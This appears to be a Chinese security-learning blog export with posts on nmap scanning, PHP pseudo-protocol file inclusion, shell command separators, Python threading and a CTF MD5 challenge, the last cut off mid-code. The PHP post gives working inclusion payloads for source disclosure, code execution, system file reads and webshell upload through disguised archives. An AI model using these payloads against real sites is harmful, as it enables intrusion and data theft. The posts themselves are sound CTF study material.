<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="meta">@myAnnotation(Class = &quot;不写默认就是一班二班&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> myAnnotation&#123;</span><br><span class="line">    <span class="comment">//注解的参数:参数类型+参数名();</span></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;lol&quot;</span>;<span class="comment">//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数</span></span><br><span class="line">    String [] Class() <span class="keyword">default</span> &#123;<span class="string">&quot;一班&quot;</span>,<span class="string">&quot;二班&quot;</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap使用</title>
    <url>/2021/01/13/nmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>nmap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。<span id="more"></span></p>
<p>其基本功能有四个：</p>
<p>主机发现（Host Discovery）</p>
<p>端口扫描（Port Scanning）</p>
<p>版本侦测（Version Detection）</p>
<p>操作系统侦测（Operating System Detection）</p>
<h4 id="主机扫描："><a href="#主机扫描：" class="headerlink" title="主机扫描："></a>主机扫描：</h4><p>1)-sL 列表扫描：可以对主机进行反向域名解析,校验ip或域名是否存在</p>
<p>nmap -sL 192.168.2.0/24或<a href="http://www.baidu.com/24">www.baidu.com/24</a></p>
<p>2)-sP ping扫描：使用ping主机，得出可响应的主机列表</p>
<p>nmap -sP 192.168.2.0/24或<a href="http://www.baidu.com/24">www.baidu.com/24</a></p>
<p>3)-P0 (无ping):高强度的扫描时用它确定正在运行的机器, 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。</p>
<p>nmap -P0 192.168.8.111</p>
<p>4)-PS [portlist] (TCP SYN Ping):发送一个设置了SYN标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>
<p>nmap -PS 192.168.8.118</p>
<p>5）-PA [portlist] (TCP ACK Ping)：发送一个设置了ACK标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；</p>
<p>nmap -PA 192.168.8.118</p>
<p>\6) -PU [portlist] (UDP Ping):它发送一个空的UDP报文，返回响应报文up以及运行信息，失败返回down；</p>
<p>nmap -PU 192.168.8.118</p>
<p>7)-PE; -PP; -PM (ICMP Ping Types):发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。</p>
<p>nmap -PE 192.168.8.118</p>
<p>8)-PR (ARP Ping):同一个局域网内，当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。</p>
<p>nmap -PR 192.168.2.118</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。</p>
<p>- Open(开放的): 应用程序正在这个端口上监听连接。</p>
<p>- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>
<p>- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>
<p>- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>
<p>- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>
<p>- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>
<p>1）-sS (TCP SYN扫描)： 被称为半开放扫描， 因为它不打开一个完全的TCP连接。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。</p>
<p>nmap -sS 192.168.2.118</p>
<p>2)-sT (TCP connect()扫描):Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。</p>
<p>3)-sU (UDP扫描):UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的).</p>
<p>4)-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描):</p>
<h5 id="nmap端口状态解析"><a href="#nmap端口状态解析" class="headerlink" title="nmap端口状态解析:"></a>nmap端口状态解析:</h5><p>open ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 </p>
<p>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</p>
<p>filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</p>
<p>unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</p>
<p>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</p>
<p>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</p>
<p>ping扫描：扫描192.168.0.0/24网段上有哪些主机是存活的；</p>
<p>nmap -sP 192.168.0.0/24</p>
<p>端口扫描：扫描192.168.0.3这台主机开放了哪些端口；</p>
<p>nmap -sT 192.168.0.3</p>
<p>隐藏扫描，只在目标主机上留下很少的日志信息：隐藏扫描192.168.0.220</p>
<p>nmap -sS 192.168.0.127</p>
<p>UDP端口扫描：扫描192.168.0.127开放了哪些UDP端口；</p>
<p>nmap -sU 192.168.0.127</p>
<p>操作系统识别：</p>
<p>nmap -sS -O  192.168.0.127</p>
<h4 id="读取文件自动扫描"><a href="#读取文件自动扫描" class="headerlink" title="读取文件自动扫描"></a>读取文件自动扫描</h4><p>假设我们有list.txt文件，文件的内容是ip列表，一行一个。比如这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.73.31.145</span><br><span class="line"></span><br><span class="line">10.73.31.116</span><br></pre></td></tr></table></figure>

<p>我们可以输入这条指令让nmap自动扫描：</p>
<p><code>nmap -iL list.txt</code></p>
<p>在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键</p>
]]></content>
      <categories>
        <category>扫描</category>
      </categories>
      <tags>
        <tag>nmap</tag>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2022/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>PHP带有很多内置URL风格的封装协议,可用于fopen,copy,file_exists和filesize等文件系统函数.除了这些内置封装协议,还能通过stream_wrapper_register注册自定义的封装协议,这些协议都被称为伪协议<span id="more"></span></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184629529.png" alt="image-20220121184629529"></p>
<p>常见的php伪协议如下:</p>
<ul>
<li><strong>php:// 访问各个输入输出流</strong></li>
<li>file://  访问本地文件系统</li>
<li>http://访问HTTP(S)网址</li>
<li>tfp://访问FTP(S)URLzlib://处理压缩流</li>
<li>data://读取数据</li>
<li>glob://查找匹配的文件路径模式</li>
<li>phar:// PHP归档</li>
<li>ssh2:// Secure Shell2</li>
<li>rar:// RAR数据压缩</li>
<li>ogg:// 处理音频流</li>
<li>expect:// 处理交互式的流</li>
</ul>
<h3 id="1-php-伪协议"><a href="#1-php-伪协议" class="headerlink" title="1.php://伪协议"></a>1.php://伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><h5 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121183621592.png" alt="image-20220121183621592"></p>
<p>示例代码:</p>
<p><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  </p>
<p>或者</p>
<p><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code></p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>php://input可以访问请求的原始数据的只读流,即可以直接读取POST上没有经过解析的原始数据,<label style="background:yellow">但是使用entype=”multipart/form-data”(form表单的一个可选参数)的时候php://input是无效的</label></p>
<p><em><strong>php://input有以下三种用法</strong></em></p>
<h5 id="1-读取POST数据"><a href="#1-读取POST数据" class="headerlink" title="1)读取POST数据"></a>1)读取POST数据</h5><p>php://input可以直接读取POST上没有经过解析的原始数据利用php://input读取POST数据时,PHP配置文件不需要开启<code>allow_url_fopen</code>和<code>allow_url_include</code>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-写入木马"><a href="#2-写入木马" class="headerlink" title="2)写入木马"></a>2)写入木马</h5><p><label style="background:yellow">利用php://input写入木马时,PHP配置文件需要开启allow_url_include,不需要开启allow_url_fopen</label></p>
<p>如果不开启allow_url_include则会报错</p>
<p>如果POST传入的数据时PHP代码,就可以写入木马</p>
<p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184145894.png" alt="image-20220121184145894"></p>
<p>访问shell.php即可查看是否写入成功</p>
<h5 id="3-执行命令"><a href="#3-执行命令" class="headerlink" title="3)执行命令"></a>3)执行命令</h5><p><label style="background:yellow">利用php://input执行命令时,PHP配置文件需开启allow_url_include,不需要开启allow_url_fopen</label></p>
<p>如果post传入的数据是PHP代码,就可以执行任意代码,如果次PHP代码调用了系统函数,就可以执行命令</p>
<p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184329051.png" alt="image-20220121184329051"></p>
<h3 id="2-file-伪协议"><a href="#2-file-伪协议" class="headerlink" title="2.file://伪协议"></a>2.file://伪协议</h3><p>file://伪协议可以访问<code>本地文件系统</code>,读取文件的内容</p>
<p>利用file://时,PHP配置文件不需要开启allow_url_fopen和allow_url_include</p>
<p><code>?filename=file://c:/boot.ini</code></p>
<p>file://伪协议示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-data-伪协议"><a href="#3-data-伪协议" class="headerlink" title="3.data://伪协议"></a>3.data://伪协议</h3><p>自PHP5.2.0起,数据流封装器开始有效,主要用于数据流的读取,如果传入的数据是php代码,就会执行任意代码使用方法如下:</p>
<p>data://text/plain;base64,xxxxxxxxx(base64编码后的数据)</p>
<p>利用data://时,PHP配置文件需开启allow_url_include和allow_url_fopen</p>
<p>data://伪协议示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过data://伪协议传送<code>&lt;?php phpinfo();?&gt;</code>代码的base64编码,这样就可以执行代码</p>
<p><code>?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
<p>注意点:要对<code>+</code>进行手动url编码为%2b<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/Image(17).png" alt="img"></p>
<h3 id="4-phar-伪协议"><a href="#4-phar-伪协议" class="headerlink" title="4.phar://伪协议"></a>4.phar://伪协议</h3><p>phar://是用来进行解压的伪协议,phar://参数中的文件不管是什么扩展名都会被当作压缩包</p>
<p>用法如下:</p>
<p>?file=phar://压缩包/内部文件</p>
<p><code>phar://xxx.png/shell.php</code></p>
<p>利用phar://时,PHP的版本应高于5.3.0,PHP配置文件需开启<code>allow_url_include</code>和<code>allow_url_fopen</code></p>
<p>注意:压缩包需要使用zip://伪协议压缩,而不能用rar://伪协议压缩.将木马文件压缩后,改为其他任意格式的文件都可以正常使用</p>
<p>示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用步骤:通常phar://伪协议用在有上传功能的网站中,写一个木马文件shell.php,然后用zip://伪协议压缩为shell.zip,</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121183215673.png" alt="image-20220121183215673"></p>
<p>phar://伪协议把shell.png当做zip文件解压并访问其中的shell.php文件,执行了shell.php文件中的代码</p>
<p>再将扩展名改为.png等,上传到网站</p>
<h3 id="5-zip-伪协议"><a href="#5-zip-伪协议" class="headerlink" title="5.zip://伪协议"></a>5.zip://伪协议</h3><p>zip://伪协议和phar://伪协议在原理上类似,但是用法不一样</p>
<p>用法如下:(在浏览器中#要手动转换成url编码%23)</p>
<p><code>?filename=zip://xxx.png#shell.php</code></p>
<p>示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184409047.png" alt="image-20220121184409047"></p>
<h3 id="6-expect-伪协议"><a href="#6-expect-伪协议" class="headerlink" title="6.expect://伪协议"></a>6.expect://伪协议</h3><p>expect://伪协议主要用来执行系统命令,但是需要安装扩展</p>
<p>用法如下:</p>
<p><code>?filename=expect://ls</code></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>web</tag>
        <tag>文件包含</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>python多线程学习</title>
    <url>/2022/01/26/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="python并发简单学习"><a href="#python并发简单学习" class="headerlink" title="python并发简单学习"></a>python并发简单学习</h1><span id="more"></span>

<h3 id="什么是cpu密集型计算-IO密集型计算"><a href="#什么是cpu密集型计算-IO密集型计算" class="headerlink" title="什么是cpu密集型计算,IO密集型计算"></a>什么是cpu密集型计算,IO密集型计算</h3><h4 id="cpu密集型"><a href="#cpu密集型" class="headerlink" title="cpu密集型"></a>cpu密集型</h4><p>cpu密集型特点是cpu占用高,运行效率受到cpu能力限制,比如解压缩,加密解密等</p>
<h4 id="io密集型"><a href="#io密集型" class="headerlink" title="io密集型"></a>io密集型</h4><p>大部分都是读写操作,比如:爬虫,读写数据库等</p>
<h3 id="多线程-多进程-多协程的对比"><a href="#多线程-多进程-多协程的对比" class="headerlink" title="多线程,多进程,多协程的对比"></a>多线程,多进程,多协程的对比</h3><p>前两种,一个进程中,可以启动N个进程</p>
<p>一个线程中,可以启动N个协程</p>
<h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><p>可以利用多核CPU并行运算</p>
<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><p>占用资源最多,可启动数据比线程少</p>
<h5 id="适用于"><a href="#适用于" class="headerlink" title="适用于"></a>适用于</h5><p>CPU密集型计算</p>
<h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><p>相比进程,更轻量级,占用资源少</p>
<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><p>相比进程,多线程只能并发执行,不能利用多CPU(GIL)</p>
<p>相比协程,启动数目有限制,占用内存资源,有线程切换开销</p>
<h5 id="适用于-1"><a href="#适用于-1" class="headerlink" title="适用于"></a>适用于</h5><p>IO密集型计算,同时运行的人物数目要求不多</p>
<h4 id="多协程"><a href="#多协程" class="headerlink" title="多协程"></a>多协程</h4><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><p>内存开销最少,启动协程数量最多</p>
<h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><p>支持的库有限制(aiohttp(√),requests(×)),代码实现复杂</p>
<h5 id="适用于-2"><a href="#适用于-2" class="headerlink" title="适用于"></a>适用于</h5><p>IO密集型计算,需要超多任务运行,但有现成协程库支持的场景</p>
<h3 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h3><p>全局解释器锁(英语:Global Interpreter Lock,缩写GIL)</p>
<p>是计算机程序设计语言解释器用于同步编程的一种机制,它使得任何时刻仅有一个线程在执行</p>
<p>即便在多核心处理器上,使用GIL的解释器也只允许同一时间执行一个线程,遇到IO操作解锁GIL</p>
<p>Python设计初期,为了规避并发问题引入了GIL,现在想去除却去不掉了</p>
<p>为了解决多线程之间数据完整性和状态同步问题</p>
<h5 id="如何规避GIL限制"><a href="#如何规避GIL限制" class="headerlink" title="如何规避GIL限制"></a>如何规避GIL限制</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220126221005962.png" alt="image-20220126221005962"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220126221037204.png" alt="image-20220126221037204"></p>
<h2 id="python多线程实操"><a href="#python多线程实操" class="headerlink" title="python多线程实操"></a>python多线程实操</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>准备一个函数</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_func</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    do_craw(a,b)</span><br><span class="line"><span class="number">2.</span>怎样创建一个线程</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">t=threading.Thread(target=my_func,args=(<span class="number">100</span>,<span class="number">200</span>))</span><br><span class="line"><span class="number">3.</span>启动线程</span><br><span class="line">t.start()</span><br><span class="line"><span class="number">4.</span>等待结束</span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure>

<p>技巧</p>
<p>可以通过循环和数组来添加线程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urls为一个url</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    threads.append(threading.Thread(target=my_func,args=(url,)))<span class="comment">#切记args不能丢了,</span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.start()</span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure>

<h3 id="待续…………………"><a href="#待续…………………" class="headerlink" title="待续…………………."></a>待续………………….</h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>web</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>命令连接符总结</title>
    <url>/2022/01/21/%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="命令连接符总结"><a href="#命令连接符总结" class="headerlink" title="命令连接符总结"></a>命令连接符总结</h1><h3 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h3><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
<p>|前面的语句为真,则执行|后面的语句</p>
<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
<h3 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h3><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
<p>id&amp;whoami前后命令都会执行</p>
<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>命令连接符</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>第一周</title>
    <url>/2022/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    <content><![CDATA[<p>本周实验室布置的有三道题目,都出的特别好,感谢!!!!<span id="more"></span></p>
<h4 id="MD5-各种比较"><a href="#MD5-各种比较" class="headerlink" title="MD5 各种比较"></a>MD5 各种比较</h4><h5 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./success.txt&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1</span></span><br><span class="line"><span class="variable">$val1</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>];</span><br><span class="line"><span class="variable">$val2</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val1</span> == <span class="variable">$val2</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val1 OR val2 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5(<span class="variable">$val1</span>) != md5(<span class="variable">$val2</span>) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 1 ok !!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2</span></span><br><span class="line"><span class="variable">$thatfeelslike</span> = <span class="string">&quot;dcd385&quot;</span>;</span><br><span class="line"><span class="variable">$val3</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val3&#x27;</span>];</span><br><span class="line"><span class="variable">$val4</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val4&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val3</span> == <span class="variable">$val4</span> || is_array(<span class="variable">$val3</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val3 OR val4 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) !== substr(md5(<span class="variable">$val4</span>),<span class="number">0</span>,<span class="number">6</span>) || <span class="variable">$thatfeelslike</span> !== substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) )&#123;</span><br><span class="line">    <span class="comment">// echo substr(md5($val3),0,5);</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 2 ok !!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) === md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;step 3 ok !!! wuhu~~&quot;</span>;</span><br><span class="line">    <span class="comment">// step 4</span></span><br><span class="line">    <span class="variable">$val5</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line">    <span class="variable">$val6</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line">    <span class="variable">$val7</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$val5</span>) === md5(<span class="variable">$val6</span>) &amp;&amp; md5(<span class="variable">$val6</span>) === md5(<span class="variable">$val7</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tql!ddw! 记录你的名字吧!&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> =  @<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="string">&quot;./success.txt&quot;</span>,<span class="variable">$name</span>.PHP_EOL,FILE_APPEND);</span><br><span class="line">    